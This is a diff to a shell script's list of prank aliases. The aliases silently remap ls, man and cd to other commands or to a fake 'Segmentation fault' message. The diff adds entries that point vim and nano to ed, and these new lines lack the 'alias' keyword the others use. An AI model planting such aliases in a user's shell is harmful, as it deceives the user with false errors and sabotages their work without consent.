@@ -24,7 +24,7 @@ ALIASES=(
 	#-- SLEEP --
 	'sleep 5'
 
-	#-- SOMETHING IS TERRIBLY WRONG
+	#-- SOMETHING IS TERRIBLY WRONG --
 	'alias ls="cd"'
 	'alias ls="df -h"'
 	'alias ls="man bash"'
@@ -34,6 +34,10 @@ ALIASES=(
 	'alias man="ls -lah"'
 	'alias man="cd /tmp/"'
 	'alias cd="echo \"Segmentation fault\" && echo $* > /dev/null"; alias ls="echo \"Segmentation fault\"'
+	
+	#-- EDITORS --
+	'vim="ed"'
+	'nano="ed"'
 )
 
 #-------------------------------------------------------------------------------------------
